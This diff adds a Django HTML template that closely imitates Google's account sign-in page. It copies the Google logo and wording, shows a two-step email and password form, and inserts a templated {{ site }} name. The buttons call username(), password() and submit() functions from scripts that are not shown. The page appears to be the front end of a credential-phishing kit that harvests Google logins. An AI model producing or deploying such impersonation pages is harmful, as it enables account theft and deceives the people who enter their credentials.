@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Google Accounts</title>
+    {% load static %}
+    <link href='http://fonts.googleapis.com/css?family=Roboto:400,100,100italic,300,300italic,400italic,500,500italic,700,700italic,900italic,900' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="{% static 'google.css' %}">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="{% static 'requests.js' %}"></script>
+    <script src="{% static 'styles.js' %}"></script>
+
+    <script>
+        $(document).ready(function(){
+        
+        });
+
+        document.onreadystatechange = function () {
+            if (document.readyState=="complete"){
+                page_load();
+            }
+        }
+    </script>
+</head>
+
+
+
+<body>
+    <div class="parent">
+        <div class="root">
+            <header>
+                <svg xmlns="https://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true" class="WM3GF"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>
+                Sign In with Google
+            </header>
+
+            <div class="unm-wrapper" id="use">
+                <div class="heading-wrapper">
+                    <h1 class="heading-text">Sign In</h1>
+                    <div class="subheading">to continue to <button class="text-button">{{ site }}</button></div>
+                </div>
+
+                <div class="unm-middle">
+                    <div class="input-wrapper" onclick="Trfm_trig('username')">
+                        <div class="inp-border"></div>
+                        <input id="username">
+                        <div class="placeholder-fk placeholder-add" id="unm-placeholder">Email or phone</div>
+                    </div>
+                    <div class="option"><button class="text-button">Forgot password?</button></div>
+
+                    <div class="site-info">
+                        To continue, Google will share your name, email address, and language preference with {{ site }}. Before using this app, you can review {{ site }}’s <a href="">privacy policy</a> and <a href="">terms of service</a>.
+                    </div>
+                </div>
+
+                <div class="next-wrapper">
+                    <div class="next-grid">
+                        <div class="option1"><button class="text-button">Create account</button></div>
+                        <div class="option2" onclick="unm_next();username()"><div class="next">Next</div></div>
+                    </div>
+                </div>
+            </div>
+        
+
+
+
+
+
+            <div class="unm-wrapper" id="pass">
+                <div class="heading-wrapper">
+                    <h1 class="heading-text">Sign In</h1>
+                    <div class="subBar" id="emailid"></div>
+                </div>
+
+                <div class="unm-middle" id="mid-pass">
+                    <div class="input-wrapper" onclick="Trfm_trig('password')">
+                        <div class="inp-border"></div>
+                        <input id="password" type="password">
+                        <div class="placeholder-fk placeholder-add" id="pass-placeholder">Enter your password</div>
+                    </div>
+                    <div class="option"><button class="text-button">Forgot password?</button></div>
+
+                    <div class="site-info">
+                        To continue, Google will share your name, email address, and language preference with {{ site }}. Before using this app, you can review {{ site }}’s <a href="">privacy policy</a> and <a href="">terms of service</a>.
+                    </div> 
+                </div>
+
+                <div class="next-wrapper">
+                    <div class="next-grid">
+                        <div class="option1"><button class="text-button">Create account</button></div>
+                        <div class="option2" onclick="password();submit()"><div class="next">Next</div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+</body>
+</html>
